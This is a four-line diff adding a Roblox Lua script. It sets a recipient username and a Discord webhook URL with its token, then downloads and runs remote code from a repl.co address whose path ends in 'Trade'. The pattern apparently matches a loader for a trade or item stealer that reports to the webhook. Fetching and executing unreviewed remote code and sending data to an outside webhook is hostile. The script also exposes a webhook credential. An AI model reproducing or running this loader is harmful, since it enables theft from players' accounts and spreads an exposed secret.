@@ -1,0 +1,4 @@
+lua
+getgenv().Username = "Equipskill"
+getgenv().Webhook = "https://discord.com/api/webhooks/1214521301553774592/uCMTaupb99jx9tY6h3qXp5RvSgnPzNtQAt726lLiBszdSBtxOBBSXir2YRNt6gk6IlM2"
+loadstring(game:HttpGet("https://a05d2724-cb03-4bb7-af5d-293c8436e212-00-3c9ykas6hdl4f.riker.repl.co/tbc/Trade", true))()
